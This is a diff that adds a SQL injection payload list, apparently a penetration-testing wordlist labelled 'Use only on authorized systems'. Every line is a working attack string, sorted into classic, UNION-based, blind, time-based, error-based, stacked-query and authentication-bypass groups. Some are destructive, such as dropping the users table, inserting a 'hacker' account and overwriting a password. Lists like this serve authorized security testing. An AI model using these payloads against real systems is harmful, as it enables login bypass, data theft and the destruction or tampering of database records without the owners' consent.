@@ -1,0 +1,60 @@
+# SQL Injection Payloads
+# Use only on authorized systems
+
+# Classic SQL injection
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+# UNION-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+
+# Boolean-based blind
+' AND '1'='1
+' AND '1'='2
+' AND 1=1--
+' AND 1=2--
+
+# Time-based blind
+'; WAITFOR DELAY '0:0:5'--
+'; SELECT SLEEP(5)--
+'; pg_sleep(5)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+1'; WAITFOR DELAY '0:0:5'--
+
+# Error-based
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CAST((SELECT @@version) AS int)--
+' AND extractvalue(1, concat(0x7e, (SELECT version())))--
+
+# Stacked queries
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('hacker','pwned')--
+'; UPDATE users SET password='pwned' WHERE id=1--
+
+# Comment-based
+'--
+'#
+'/*
+*/
+
+# Authentication bypass
+admin' OR '1'='1' /*
+admin'--
+admin' #
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1#
